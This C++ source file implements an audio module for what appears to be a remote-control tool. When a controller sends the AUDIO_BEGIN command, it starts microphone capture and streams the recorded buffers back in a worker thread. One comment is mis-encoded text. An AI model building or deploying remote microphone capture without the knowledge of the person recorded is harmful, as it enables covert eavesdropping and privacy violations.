#include "Audio.h"


CAudio::CAudio(CManager*pManager):
CMsgHandler(pManager,AUDIO)
{
	m_hWorkThread = NULL;
	m_IsWorking = FALSE;
}


CAudio::~CAudio()
{

}

void CAudio::OnOpen()
{

}

void CAudio::OnClose()
{
	OnAudioStop();
}

void CAudio::OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer)
{
	switch (Msg)
	{
	case AUDIO_BEGIN:
		OnAudioBegin();
		break;
	case AUDIO_STOP:
		OnAudioStop();
		break;
	/*case AUDIO_DATA:
		break;*/
	default:
		break;
	}
}

void CAudio::OnAudioBegin()
{
	TCHAR szError[] = L"Audio Grab Error";
	OnAudioStop();

	if (!m_AudioGrab.GrabInit()){
		SendMsg(AUDIO_ERROR, (char*)szError, sizeof(TCHAR)*(lstrlenW(szError) + 1));
		return;
	}
	InterlockedExchange(&m_IsWorking, TRUE);

	if (m_AudioGrab.StartGrab()){
		m_hWorkThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, 0);
	}
	else{
		InterlockedExchange(&m_IsWorking, FALSE);
		SendMsg(AUDIO_ERROR, (char*)szError, sizeof(TCHAR)*(lstrlenW(szError) + 1));
	}
}

void CAudio::OnAudioStop()
{
	m_AudioGrab.StopGrab();
	InterlockedExchange(&m_IsWorking, FALSE);
	
	if (m_hWorkThread){
		WaitForSingleObject(m_hWorkThread,INFINITE);
		CloseHandle(m_hWorkThread);
		m_hWorkThread = NULL;
	}
	m_AudioGrab.GrabTerm();
}

void __stdcall CAudio::WorkThread(CAudio*pThis)
{
	TCHAR szError[] = L"Get Audio Buffer Error!";
	while (InterlockedExchange(&pThis->m_IsWorking, TRUE)){
		char*Buffer = NULL;
		DWORD dwLen = NULL;
		//»ñÈ¡buffer·¢ËÍ
		if (pThis->m_AudioGrab.GetBuffer((void**)&Buffer, &dwLen)){
			pThis->SendMsg(AUDIO_DATA, Buffer, dwLen);
			free(Buffer);
		}
	}
	InterlockedExchange(&pThis->m_IsWorking, FALSE);
}